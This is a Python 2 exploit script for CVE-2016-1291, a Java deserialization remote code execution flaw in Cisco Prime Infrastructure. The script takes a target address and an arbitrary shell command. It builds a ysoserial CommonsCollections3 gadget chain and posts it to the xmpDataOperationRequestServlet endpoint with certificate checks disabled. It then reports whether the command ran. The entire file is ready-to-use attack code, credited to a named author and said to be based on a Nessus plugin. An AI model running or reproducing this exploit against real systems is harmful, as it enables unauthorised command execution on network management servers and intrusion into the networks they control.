#! /usr/bin/env python2

#Cisco Prime Infrastucture Java Deserialization RCE (CVE-2016-1291)
#Based on the nessus plugin cisco_prime_infrastucture_20161291.nasl
#Made with <3 by @byt3bl33d3r

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

import argparse
import sys, os
from binascii import hexlify, unhexlify
from subprocess import check_output

ysoserial_default_paths = ['./ysoserial.jar', '../ysoserial.jar']
ysoserial_path = None

parser = argparse.ArgumentParser()
parser.add_argument('target', type=str, help='Target IP:PORT')
parser.add_argument('command', type=str, help='Command to run on target')
parser.add_argument('--proto', choices={'http', 'https'}, default='https', help='Send exploit over http or https (default: https)')
parser.add_argument('--ysoserial-path', metavar='PATH', type=str, help='Path to ysoserial JAR (default: tries current and previous directory)')

if len(sys.argv) < 2:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

if not args.ysoserial_path:
    for path in ysoserial_default_paths:
        if os.path.exists(path):
            ysoserial_path = path
else:
    if os.path.exists(args.ysoserial_path):
        ysoserial_path = args.ysoserial_path

if ysoserial_path is None:
    print "[-] Could not find ysoserial JAR file"
    sys.exit(1)

if len(args.target.split(':')) != 2:
    print '[-] Target must be in format IP:PORT'
    sys.exit(1)

if not args.command:
    print '[-] You must specify a command to run'
    sys.exit(1)

ip, port = args.target.split(':')

print '[*] Target IP: {}'.format(ip)
print '[*] Target PORT: {}'.format(port)

payload = 'aced0005771d001b492068616420736f6d657468696e6720666f7220746869732e2e2e'

gadget = check_output(['java', '-jar', ysoserial_path, 'CommonsCollections3', args.command])

payload += hexlify(gadget[4:])

r = requests.post('{}://{}:{}/xmp_data_handler_service/xmpDataOperationRequestServlet'.format(args.proto, ip, port), verify=False, data=unhexlify(payload))
if r.status_code == 200 and 'InstantiateTransformer: Constructor threw an exception' in r.text:
	print '[+] Command executed successfully'
